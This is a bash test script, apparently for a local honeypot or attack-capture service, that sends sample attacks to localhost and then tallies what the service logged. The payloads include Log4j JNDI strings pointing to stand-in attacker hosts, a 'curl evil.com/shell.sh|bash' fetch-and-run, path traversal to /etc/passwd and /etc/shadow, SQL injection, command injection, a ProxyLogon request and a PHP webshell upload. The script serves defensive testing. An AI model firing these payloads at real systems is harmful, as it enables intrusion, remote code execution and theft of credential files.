#!/bin/bash

echo "🧪 Testing Capture Functionality with Real Template Paths"
echo "=========================================================="
echo ""

BASE="http://localhost:8080"

# Clean old captures
rm -rf captures/*

echo "=== Test 1: Log4j Command Injection (CVE-2021-44228) ==="
echo "Testing Log4j JNDI injection with command..."
curl -s "$BASE/admin" \
  -H "X-Api-Version: \${jndi:ldap://evil.com/\$(whoami)}" \
  -H "User-Agent: \${jndi:ldap://attacker.com/a}" \
  >/dev/null
echo "✓ Sent Log4j payload"
sleep 1

echo ""
echo "=== Test 2: Path Traversal Attacks ==="
echo "Testing path traversal to /etc/passwd..."
curl -s "$BASE/../../etc/passwd" >/dev/null
curl -s "$BASE/file.php?path=../../etc/passwd&cmd=cat" >/dev/null  
curl -s "$BASE/download?file=../../../etc/passwd" >/dev/null
echo "✓ Sent path traversal requests"
sleep 1

echo ""
echo "=== Test 3: Exchange ProxyLogon (CVE-2021-26855) ==="
echo "Testing Exchange SSRF..."
curl -s "$BASE/ecp/DDI/DDIService.svc/GetObject" \
  -H "Cookie: X-AnonResource=true; X-BEResource=localhost/ecp/DDI/DDIService.svc?schema=OABVirtualDirectory" \
  >/dev/null
echo "✓ Sent Exchange exploit"
sleep 1

echo ""
echo "=== Test 4: Admin Panel with SQL Injection ==="
echo "Testing admin login with SQLi..."
curl -s "$BASE/admin/login" \
  -d "username=admin' OR '1'='1&password=anything" \
  -d "email=test@test.com" \
  >/dev/null
echo "✓ Sent SQL injection"
sleep 1

echo ""
echo "=== Test 5: PHPInfo with Command Injection ==="
echo "Testing phpinfo with RCE..."
curl -s "$BASE/phpinfo.php?cmd=whoami;id;uname+-a" >/dev/null
echo "✓ Sent command injection"
sleep 1

echo ""
echo "=== Test 6: File Upload Attack ==="
echo "Testing malicious file upload..."
curl -s "$BASE/admin" \
  -F "file=@-;filename=shell.php" \
  -F "content=<?php system(\$_GET['cmd']); ?>" \
  <<< '<?php system($_GET["cmd"]); ?>' \
  >/dev/null
echo "✓ Sent file upload"
sleep 1

echo ""
echo "=== Test 7: Multiple Attack Vectors ==="
curl -s "$BASE/admin?action=\$(curl+evil.com/shell.sh|bash)" >/dev/null
curl -s "$BASE/login" -d "user=\${jndi:rmi://attacker/Exploit}" >/dev/null
curl -s "$BASE/../../etc/passwd?cmd=cat+/etc/shadow" >/dev/null
echo "✓ Sent combined attacks"
sleep 2

echo ""
echo "=========================================================="
echo "📊 Checking Captures..."
echo "=========================================================="
echo ""

echo "Interactions: $(wc -l < captures/interactions.jsonl 2>/dev/null || echo 0)"
echo "Commands:     $(find captures/commands/ -type f 2>/dev/null | wc -l | tr -d ' ')"
echo "Files:        $(find captures/files/ -type f ! -name "*.meta" 2>/dev/null | wc -l | tr -d ' ')"
echo "Webshells:    $(find captures/webshells/ -type f ! -name "*.analysis" 2>/dev/null | wc -l | tr -d ' ')"
echo "SQL:          $(find captures/sql/ -type f 2>/dev/null | wc -l | tr -d ' ')"
echo "Payloads:     $(find captures/payloads/ -type f ! -name "*.meta" 2>/dev/null | wc -l | tr -d ' ')"

echo ""
echo "=== Sample Captures ==="

if [ -d captures/commands ] && [ "$(ls -A captures/commands 2>/dev/null)" ]; then
    echo ""
    echo "📝 Command Capture:"
    find captures/commands -type f | head -1 | xargs cat | head -10
fi

if [ -d captures/payloads ] && [ "$(ls -A captures/payloads 2>/dev/null)" ]; then
    echo ""
    echo "💣 Payload Capture:"
    find captures/payloads -type f -name "*.bin" | head -1 | xargs cat
fi

if [ -d captures/sql ] && [ "$(ls -A captures/sql 2>/dev/null)" ]; then
    echo ""
    echo "🗄️  SQL Injection Capture:"
    find captures/sql -type f | head -1 | xargs cat | head -10
fi

echo ""
echo "✅ Test complete! View dashboard at http://localhost:9090"
